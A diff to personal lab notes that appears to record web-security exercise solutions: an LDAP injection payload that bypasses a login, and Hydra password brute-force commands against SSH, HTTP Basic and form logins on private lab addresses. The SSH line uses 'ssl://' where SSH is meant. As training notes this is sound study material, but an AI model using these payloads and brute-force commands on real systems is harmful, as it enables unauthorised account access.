@@ -9,5 +9,25 @@
 ## LDAP attacks
 | excercise | solution |
 |-----------|----------|
-| example&nbsp;1 | http://10.0.2.4/ldap/example1.php |
+| example&nbsp;1 | http://10.0.2.4/ldap/example1.php `remove all parameter` |
 | example&nbsp;2 | http://10.0.2.4/ldap/example2.php?name=hacker)(cn=*))%00&password=1234 |
+
+## Hydra
+###Secure Shell
+hydra -P /usr/shared/wordlists/rockyou.txt
+	  -l root
+	  ssl://10.0.4.5
+	  -f -vVd 
+	  -o result.txt
+	  -e nsr
+
+### Basic Authentication
+hydra -P /usr/shared/wordlists/rockyou.txt
+	  -l admin
+	  10.0.4.5 http-get "/auth"
+	  -f
+### Form Authentication
+hydra -P /usr/shared/wordlists/rockyou.txt
+	  -l admin
+	  10.0.4.5 http-post-form "/login:username=^USER^:password=^PASS^:submit=Login:F=Invalid username"
+	  -f
